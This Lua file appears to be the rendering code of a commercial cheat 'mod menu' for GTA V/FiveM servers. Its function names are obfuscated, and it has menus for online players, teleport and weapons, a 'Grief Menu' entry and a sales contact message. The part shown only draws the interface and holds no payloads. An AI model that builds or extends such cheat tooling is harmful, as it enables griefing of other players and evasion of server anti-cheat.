	return { x = minimapTopX, y = minimapTopY }
end

-- Pushes previous notifications down. Showing the incoming notification on top
local function djOIewKwGS(v, id, duration)
	for i, _ in pairs(v) do
		if i ~= id then
			if v[i].draw then
				qEBqrQgyir(v[i], v[i].y, v[i].y + ((notifyBody.height + ((v[id].lines - 1) * notifyBody.height)) + notifyBody.gap), duration)
			end
		end
	end
end

local fontHeight = GetTextScaleHeight(notifyBody.scale, notifyBody.font)

local properties = { -- 0.72
	x = 0.78 + menuWidth / 2, 
	y = 1.0, 
	notif = {}, 
	offset = djOIewKwGS,
}

local sound_type = {
	['success'] = { name = "CHALLENGE_UNLOCKED", set = "HUD_AWARDS"},
	['info'] = { name = "FocusIn", set = "HintCamSounds" },
	['error'] = { name = "CHECKPOINT_MISSED", set = "HUD_MINI_GAME_SOUNDSET"},
}

local draw_type = {
	['success'] = { color = themeColors.green, dict = "commonmenu", sprite = "shop_tick_icon", size = 0.016},
	['info'] = { color = themeColors.blue, dict = "shared", sprite = "info_icon_32", size = 0.012},
	['error'] = { color = themeColors.red, dict = "commonmenu", sprite = "shop_lock", size = 0.016},
}

-- Text render wrapper for dynamic animation
local function fabhlxuXCi(v, text)
	SetTextFont(notifyBody.font)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + (menuWidth / 2))
	SetTextColour(255, 255, 255, v.opacity)

	BeginTextCommandDisplayText("notification_buffer")
	AddTextComponentSubstringPlayerName("    " .. text)
	EndTextCommandDisplayText(v.x - notifyBody.width / 2 + frameWidth / 2 + buttonTextXOffset, v.y - notifyBody.gap) -- (notifyBody.height / 2 - fontHeight / 2)
end

-- xsgkNwXpxT and QcLQRmNAPn wrapper for dynamic animation
local function dspcNBTRoe(v)
	-- Background
	QcLQRmNAPn(v.x, v.y + ((v.lines - 1) * (notifyBody.height / 2)) + notifyBody.gap, notifyBody.width, notifyBody.height + ((v.lines - 1) * notifyBody.height), draw_type[v.type].color.r, draw_type[v.type].color.g, draw_type[v.type].color.b, v.opacity - 100) --57,55,91
	xsgkNwXpxT(draw_type[v.type].dict, draw_type[v.type].sprite, v.x - notifyBody.width / 2 + 0.008, v.y + notifyBody.gap, draw_type[v.type].size, nil, 0.0, 255, 255, 255, v.opacity)
	-- Highlight
	-- QcLQRmNAPn(v.x - 0.0025 - (notifyBody.width / 2), v.y + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding) / 2, 0.005, notifyBody.height + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding), draw_type[v.type].r, draw_type[v.type].g, draw_type[v.type].b, v.opacity) -- 116, 92, 151
	
	
	--QcLQRmNAPn(minimap.x, minimap.y, 0.01, 0.015, 255, 255, 255, v.opacity)
	--xsgkNwXpxT(body.dict, body.sprite, v.x - 0.045, v.y, 0.010, 0.04, 0, 255, 255, 255, v.opacity - 50)
end

local function LBkvSThEMN(inputString, ...)
	local format = string.format
	text = format(inputString, ...)
	return text
end

local notifyPreviousText = nil

local notifyQueue = 0

-- Free up the `p.notif` table if notification is no longer being drawn on screen
local function vmpILEKXrL()
	--local disposeList = {}
	local notif = properties.notif

	-- print("^3NotifyRecycle: ^0Old table size: ^3" .. #p.notif)

	local drawnTable = {}

	-- allocate notifications currently on screen to drawnTable
	for i, _ in pairs(notif) do
		if notif[i].draw then
			drawnTable[i] = notif[i]
		end
	end

	-- remove notifications if they aren't drawing; shrinks size of table
	notif = drawnTable


	-- print("^3NotifyRecycle: ^0New table size: ^3" .. #p.notif)
	-- print("^3NotifyRecycle: ^4Returning: ^3" .. #p.notif + 1)
	return #notif + 1
end

-- Responsible for making sure the notification 'stick' to the menu footer
local function uZdOUVtTwh()
	local p = properties
	local stackIndex = 0

	for id, _ in pairs(p.notif) do
		if p.notif[id].draw then
			stackIndex = stackIndex + 1
		end
	end

	-- print("^5Recalibrate:^0 table size is " .. stackIndex)

	for id, _ in pairs(p.notif) do
		if p.notif[id].draw then
			if p.notif[id].tin then p.notif[id].tin = false end
			-- if p.notif[id].makeRoom then p.notif[id].makeRoom = false end

			-- print("^5Recalibrate ID: ^0" .. id)
			p.notif[id].y = (p.y - notifyBody.footerYOffset) + ((notifyBody.height + ((p.notif[id].lines - 1) * notifyBody.height) + notifyBody.gap) * (stackIndex - 1))
		
			stackIndex = stackIndex - 1
		end
	end
end

-- Define thread function
local function uQOishZtfU(options)
	local text = options.text or notifyDefault.text
	local transition = options.transition or notifyDefault.transition
	local timeout = options.timeout or notifyDefault.timeout
	local type = options.type or notifyDefault.type
	local sound = sound_type[type]
	
	local p = properties

	local nbrLines = mKGNQLEGbF(p, text)

	local beginY = 0.0
	local beginAlpha = 0
	
	-- garbage queueing system :)
	notifyQueue = notifyQueue + transition
	Wait(notifyQueue - transition)
	
	local id = vmpILEKXrL()

	--print("^3-------- Notification " .. id .. " " .. type .. "--------")
	p.notif[id] = {
		x = p.x,
		y = 0,
		type = type,
		opacity = 0,
		lines = nbrLines,
		tin = true,
		draw = true,
		tout = false,
	}

	p.offset(p.notif, id, transition) --(0.05 * (id - 1))
	
	-- Drawing
	local function BnnFuRarVk()
		SetScriptGfxDrawOrder(5)
		while p.notif[id].draw do
			if fjustimenUI.nCSSMFuBTF() then
				dspcNBTRoe(p.notif[id])
				fabhlxuXCi(p.notif[id], text)
			end
			Wait(0)
		end
	
		-- Schedule notification for garbage collection
		p.notif[id].dispose = true
	end
	IOeFDEouNG(BnnFuRarVk)

	-- Transition In
	local function sdMJqvsZvN()
		local change = p.y - notifyBody.footerYOffset

		local timer = 0
	
		local function SetTimerIn() -- set the timer to 0
			timer = GetGameTimer()
		end
	
		local function GetTimerIn() -- gets the timer (counts up)
			return GetGameTimer() - timer
		end
		
		PlaySoundFrontend(-1, sound.name, sound.set, true)
	
		SetTimerIn() -- reset current timer to 0
		while p.notif[id].tin do
			local tinY = outCubic(GetTimerIn(), beginY, change, transition)
			local tinAlpha = inOutCubic(GetTimerIn(), beginAlpha, 255, transition)
	
			if p.notif[id].y >= change then
				p.notif[id].y = change
				p.notif[id].tin = false
				break
			else
				p.notif[id].y = tinY
				p.notif[id].opacity = floor(tinAlpha + 0.5)
			end
			Wait(5)
		end
		notifyQueue = notifyQueue - transition
		p.notif[id].opacity = 255
	end
	IOeFDEouNG(sdMJqvsZvN)

	-- Fade out wait timeout
	Wait(timeout + transition)
	p.notif[id].beginOut = true
	p.notif[id].tout = true
	
	-- Fade out
	local function LmNOtaDQnG()
		local timer = 0
	
		local function DitAqTqcWT(ms)
			timer = GetGameTimer() - ms
		end
	
		local function fQqfFRNNYh()
			return GetGameTimer() - timer
		end
	
		while p.notif[id].draw do
			while p.notif[id].tout do
				
				if p.notif[id].beginOut then 
					DitAqTqcWT(0)
					p.notif[id].beginOut = false 
				end
	
				local opa = inOutCubic(fQqfFRNNYh(), 255, -510, transition)
				if opa <= 0 then
	
					p.notif[id].tout = false
					p.notif[id].draw = false
	
					break
				else
					p.notif[id].opacity = floor(opa + 0.5)
				end
				Wait(5)
			end
			
			Wait(5)
		end
	end
	IOeFDEouNG(LmNOtaDQnG)
end


local function xlkDNqrTTN(text)
	if fjustimenUI.debug then
		Citizen.Trace("[fjustimenUI] " .. text)
	end
end

local function UtxwxNTRfj(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
	end
end

local function bTaXXysBSa(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function vKuBqBMrNu(id, visible, restoreIndex)
	if id and menus[id] then
		UtxwxNTRfj(id, "visible", visible)
		UtxwxNTRfj(id, "currentOption", 1)

		if restoreIndex then
			UtxwxNTRfj(id, "currentOption", menus[id].storedOption)
		end

		if visible then
			if id ~= currentMenu and bTaXXysBSa(currentMenu) then
				UtxwxNTRfj(currentMenu, "storedOption", menus[currentMenu].currentOption)
				vKuBqBMrNu(currentMenu, false)
			end

			currentMenu = id
		end

		
		if dynamicColorTheme then

			if bTaXXysBSa("SelfMenu") then
				_menuColor.base = themeColors.green
			elseif bTaXXysBSa("OnlinePlayersMenu") then
				_menuColor.base = themeColors.blue
			elseif bTaXXysBSa("VisualMenu") then
				_menuColor.base = themeColors.red
			elseif bTaXXysBSa("TeleportMenu") then
				_menuColor.base = themeColors.yellow
			elseif bTaXXysBSa("LocalVehicleMenu") then
				_menuColor.base = themeColors.orange
			elseif bTaXXysBSa("LocalWepMenu") then
				_menuColor.base = themeColors.red
			elseif bTaXXysBSa("fjustimenMainMenu") then
				_menuColor.base = themeColors.purple 
			end
		end
	end
end

local function MCsXXBhWJK(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale / aspectRatio, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	BeginTextCommandDisplayText("text_buffer")
	AddTextComponentString(text)
	EndTextCommandDisplayText(x, y)
end

local function cdRAXXKqAQ(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale / aspectRatio, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			local rX = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2
			SetTextWrap(rX, rX + previewWidth / 2 - buttonTextXOffset / 2)
			SetTextRightJustify(true)
		end
	end
	BeginTextCommandDisplayText("preview_text_buffer")
	AddTextComponentString(text)
	EndTextCommandDisplayText(x, y)
end

local function QcLQRmNAPn(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

-- [NOTE] MenuDrawTitle
local function wdQwAfAMhU()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2
		if menus[currentMenu].background == "default" then
			if _menuColor.base == themeColors.purple then
				QcLQRmNAPn(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
			else
				xsgkNwXpxT("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- 255, 76, 60,
				xsgkNwXpxT("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
		elseif menus[currentMenu].background == "weaponlist" then
			if _menuColor.base == themeColors.purple then
				xsgkNwXpxT("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 255, 255, 140) -- 255, 76, 60,
			else
				xsgkNwXpxT("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
			 -- rgb(155, 89, 182)
		elseif menus[currentMenu].titleBackgroundSprite then
			xsgkNwXpxT(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			QcLQRmNAPn(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		MCsXXBhWJK(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function TnZOUQgMVa()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		-- Header
		QcLQRmNAPn(x, y, menuWidth, buttonHeight, menus[currentMenu].menuFrameColor)
		-- Separator
		QcLQRmNAPn(x, y + (buttonHeight / 2) + (separatorHeight / 2), menuWidth, separatorHeight, _menuColor.base)

		MCsXXBhWJK(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			_menuColor.base,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			MCsXXBhWJK(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				_menuColor.base,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local welcomeMsg = true

local function IgJGMmbgGn()
	if menus[currentMenu] then
		local multiplier = nil
		local x = menus[currentMenu].x + menuWidth / 2
		-- local y = menus[currentMenu].y + titleHeight - 0.015 + buttonHeight + menus[currentMenu].maxOptionCount * buttonHeight
		-- xsgkNwXpxT("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- r = 231, g = 76, b = 60
		local footerColor = menus[currentMenu].menuFrameColor

		if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
			multiplier = optionCount
		elseif optionCount >= menus[currentMenu].currentOption then
			multiplier = 10
		end

		if multiplier then
			local y = menus[currentMenu].y + titleHeight + buttonHeight + separatorHeight + (buttonHeight * multiplier) --0.015

			-- Footer
			QcLQRmNAPn(x, y + (footerHeight / 2), menuWidth, footerHeight, footerColor)

			local yFrame = menus[currentMenu].y + titleHeight + ((buttonHeight + separatorHeight + (buttonHeight * multiplier) + footerHeight) / 2)
			local frameHeight = buttonHeight + separatorHeight + footerHeight + (buttonHeight * multiplier)
			-- Frame Left
			QcLQRmNAPn(x - menuWidth / 2, yFrame, frameWidth, frameHeight, footerColor)
			-- Frame Right
			QcLQRmNAPn(x + menuWidth / 2, yFrame, frameWidth, frameHeight, footerColor)

			MCsXXBhWJK(menus[currentMenu].version, menus[currentMenu].x + buttonTextXOffset, y - separatorHeight + (footerHeight / 2 - fontHeight / 2), menus[currentMenu].titleFont, {r = 255, g = 255, b = 255, a = 128}, buttonScale, false)
			MCsXXBhWJK(menus[currentMenu].branding, x, y - separatorHeight + (footerHeight / 2 - fontHeight / 2), menus[currentMenu].titleFont, menus[currentMenu].titleColor, buttonScale, false, false, true)
			
			local offset = 1.0 - (y + footerHeight / 2 + notifyBody.height)

			if notifyBody.footerYOffset ~= offset then
				notifyBody.footerYOffset = offset
				uZdOUVtTwh()
			end
		end

		if welcomeMsg then
			welcomeMsg = false
			fjustimenUI.SendNotification({text = "If you want to buy menu, contact printf('Szpachlan | J sokina');#8756!", type = "info"})
		end
	end
end

local function uumgDNIAYe(text, subText, color, subcolor)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + 0.0025 + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = color or menus[currentMenu].menuFocusTextColor
			pointColor = menus[currentMenu].menuFocusPointerColor
			subTextColor = subcolor or menus[currentMenu].menuSubTextColor
			selectionColor = { r = 255, g = 255, b = 255, a = 255 }
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = color or menus[currentMenu].menuTextColor
			pointColor = menus[currentMenu].menuInvisibleColor
			subTextColor = subcolor or menus[currentMenu].menuSubTextColor
			selectionColor = menus[currentMenu].menuInvisibleColor
			--shadow = true
		end

		QcLQRmNAPn(x, y, menuWidth, buttonHeight, backgroundColor)

		if (text ~= "~r~Grief Menu" and text ~= "~b~Menu Settings") and menus[currentMenu].subTitle == "OMG WTF LMAO" then -- and subText == "isMenu"
			MCsXXBhWJK(
			text,
			menus[currentMenu].x + 0.020,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
			)

			if text == "Self Options" then
				-- w/h = 0.02
				xsgkNwXpxT("mpleaderboard", "leaderboard_players_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, 255) -- rgb(26, 188, 156)
			elseif text == "Online Options" then
				xsgkNwXpxT("mpleaderboard", "leaderboard_friends_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 152, 219, 255) -- rgb(52, 152, 219)
			elseif text == "Visual Options" then
				xsgkNwXpxT("mphud", "spectating", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 236, 240, 241, 255) -- rgb(236, 240, 241)
			elseif text == "Teleport Options" then
				xsgkNwXpxT("mpleaderboard", "leaderboard_star_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 241, 196, 15, 255) -- rgb(241, 196, 15)
			elseif text == "Vehicle Options" then
				xsgkNwXpxT("mpleaderboard", "leaderboard_transport_car_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 230, 126, 34, 255) -- rgb(230, 126, 34)
			elseif text == "Weapon Options" then
				xsgkNwXpxT("mpleaderboard", "leaderboard_kd_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 231, 76, 60, 255) -- rgb(231, 76, 60)
			elseif text == "Server Options" then
				xsgkNwXpxT("mpleaderboard", "leaderboard_globe_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 155, 89, 182, 255) -- rgb(155, 89, 182)
			end
		else
			MCsXXBhWJK(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
			)
		end

		if subText == "isMenu" then
			xsgkNwXpxT("mparrow", "mp_arrowlarge", x + menuWidth / 2.25, y, 0.008, nil, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
			-- menus[currentMenu].title = ""
		elseif subText == "toggleOff" then
			x = x + menuWidth / 2 - frameWidth / 2 - toggleOuterWidth / 2 - buttonTextXOffset
			QcLQRmNAPn(x, y, toggleOuterWidth, toggleOuterHeight, menus[currentMenu].buttonSubBackgroundColor)
			-- QcLQRmNAPn(x, y, toggleInnerWidth, toggleInnerHeight, {r = 90, g = 90, b = 90, a = 230})
		elseif subText == "toggleOn" then
			x = x + menuWidth / 2 - frameWidth / 2 - toggleOuterWidth / 2 - buttonTextXOffset
			QcLQRmNAPn(x, y, toggleOuterWidth, toggleOuterHeight, menus[currentMenu].buttonSubBackgroundColor)
			xsgkNwXpxT("commonmenu", "shop_tick_icon", x, y, 0.020, nil, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			--QcLQRmNAPn(x, y, toggleInnerWidth, toggleInnerHeight, _menuColor.base) -- 26, 188, 156, 255
		elseif subText == "danger" then
			xsgkNwXpxT("commonmenu", "mp_alerttriangle", x + menuWidth / 2.35, y, 0.021, nil, 0.0, 255, 255, 255, 255)
		elseif subText then			
			MCsXXBhWJK(
				subText,
				menus[currentMenu].x + 0.005,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)

		end

	end
end

local function FQjuNjGJRY(text, selectedIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + 0.0025 + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		
		local backgroundColor = menus[currentMenu].menuBackgroundColor
		local textColor = menus[currentMenu].menuTextColor
		local subTextColor = menus[currentMenu].menuSubTextColor
		local pointColor = menus[currentMenu].menuInvisibleColor
		
		local textX = x + menuWidth / 2 - frameWidth - buttonTextXOffset
		local selected = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = _menuColor.base
			pointColor = menus[currentMenu].menuSubTextColor
			textX = x + menuWidth / 2.25 - 0.019
			selected = true
		end

		-- Button background
		QcLQRmNAPn(x, y, menuWidth, buttonHeight, backgroundColor)

		-- Button title
		MCsXXBhWJK(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false
		)
		
		-- xsgkNwXpxT("mparrow", "mp_arrowlarge", x + menuWidth / 2.25, y, 0.008, nil, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)			

		xsgkNwXpxT("pilotschool", "hudarrow", x + menuWidth / 2 - frameWidth / 2 - sliderWidth, y + separatorHeight / 2, 0.008, nil, -90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
		
		-- Selection Text
		MCsXXBhWJK(
			selectedIndex,
			textX,
			y - separatorHeight - (buttonHeight / 2 - fontHeight / 2) ,
			buttonFont,
			subTextColor,
			buttonScale,
			selected,
			false,
			not selected
		)	

		xsgkNwXpxT("pilotschool", "hudarrow", x + menuWidth / 2.25, y + separatorHeight / 2, 0.008, nil, 90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
	end
end

-- Invokes NotifyNewThread
function fjustimenUI.SendNotification(options)
	local InvokeNotification = function() return uQOishZtfU(options) end
	-- Delegate coroutine
	IOeFDEouNG(InvokeNotification) 
end

function fjustimenUI.ZSHhGazsPX(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "MAIN MENU"
	menus[id].branding = ""
	menus[id].version = "2.0"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.78
    menus[id].y = 0.19
    
    menus[id].width = menuWidth

	menus[id].currentOption = 1
	menus[id].storedOption = 1 -- This is used when going back to previous menu
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 4
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].background = "default"
	menus[id].titleBackgroundColor = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 180}

	
	menus[id].menuTextColor = {r = 220, g = 220, b = 220, a = 255}
	menus[id].menuSubTextColor = {r = 140, g = 140, b = 140, a = 255}
	
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuFocusBackgroundColor = {r = 231, g = 76, b = 60, a = 100} -- rgb(31, 32, 34) rgb(155, 89, 182) #9b59b6
	menus[id].menuFocusPointerColor = {r = 255, g = 255, b = 255, a = 128}

	menus[id].menuBackgroundColor = {r = 18, g = 20, b = 20, a = 0} -- #121212
	menus[id].menuFrameColor = {r = 0, g = 0, b = 0, a = 0}
	menus[id].menuInvisibleColor = { r = 0, g = 0, b = 0, a = 0 }

	menus[id].buttonSubBackgroundColor = {r = 35, g = 39, b = 40, a = 255}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5
end

function fjustimenUI.vjuHbvKVEN(id, parent, subTitle)
	if menus[parent] then
		fjustimenUI.ZSHhGazsPX(id, menus[parent].title)

		if subTitle then
			UtxwxNTRfj(id, "subTitle", string.upper(subTitle))
		else
			UtxwxNTRfj(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		UtxwxNTRfj(id, "previousMenu", parent)

		UtxwxNTRfj(id, "x", menus[parent].x)
		UtxwxNTRfj(id, "y", menus[parent].y)
		UtxwxNTRfj(id, "maxOptionCount", menus[parent].maxOptionCount)
		UtxwxNTRfj(id, "titleFont", menus[parent].titleFont)
		UtxwxNTRfj(id, "titleColor", menus[parent].titleColor)
		UtxwxNTRfj(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		UtxwxNTRfj(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		UtxwxNTRfj(id, "menuTextColor", menus[parent].menuTextColor)
		UtxwxNTRfj(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		UtxwxNTRfj(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		UtxwxNTRfj(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		UtxwxNTRfj(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		UtxwxNTRfj(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
		
		UtxwxNTRfj(id, "buttonSubBackgroundColor", menus[parent].buttonSubBackgroundColor)
	end
end

function fjustimenUI.lSCincHzQa()
	return currentMenu
end

function fjustimenUI.DGJZFFYctr(id)
	if id and menus[id] then
		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end
		
		vKuBqBMrNu(id, true)
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
	end
end

function fjustimenUI.aWlfWfxYaq(id)
	return bTaXXysBSa(id)
end

function fjustimenUI.nCSSMFuBTF()
	for id, _ in pairs(menus) do
		if bTaXXysBSa(id) then
			return true
		end
	end

	return false
end

function fjustimenUI.NKPkFcoiJT()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function fjustimenUI.BAmKCdiWiG()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			vKuBqBMrNu(currentMenu, false)
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
		end
	end
end

function fjustimenUI.GwGoBeHRde(text, subText, color, subcolor)

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		uumgDNIAYe(text, subText, color, subcolor)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			end
		end

		return false
	end

end

-- Button with a slider
function fjustimenUI.pJZvwZInDS(text, items, selectedIndex, callback, vehicleMod)
	local itemsCount = #items
	local selectedItem = items[selectedIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if vehicleMod then
		selectedIndex = selectedIndex + 2
	end

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if fjustimenUI.RugSAmWXJf(text, items, itemsCount, selectedIndex) then
		callback(selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if selectedIndex > 1 then selectedIndex = selectedIndex - 1 end
		elseif currentKey == keys.right then
            if selectedIndex < itemsCount then selectedIndex = selectedIndex + 1 end
		end
	end
	
	callback(selectedIndex)
	return false
end

local function WccwteMAhz(text, items, itemsCount, selectedIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if (menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount) and (optionCount <= menus[currentMenu].maxOptionCount) then
		multiplier = optionCount
	elseif (optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount) and (optionCount <= menus[currentMenu].currentOption) then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + separatorHeight + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		
		local backgroundColor = menus[currentMenu].menuBackgroundColor
		local textColor = menus[currentMenu].menuTextColor
		local subTextColor = menus[currentMenu].menuSubTextColor
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		end

		local sliderColorBase = menus[currentMenu].buttonSubBackgroundColor
		local sliderColorKnob = {r = 90, g = 90, b = 90, a = 255}
		local sliderColorText = {r = 206, g = 206, b = 206, a = 200}

		if selectedIndex > 1 then
			sliderColorBase = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 50}
			sliderColorKnob = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 140}
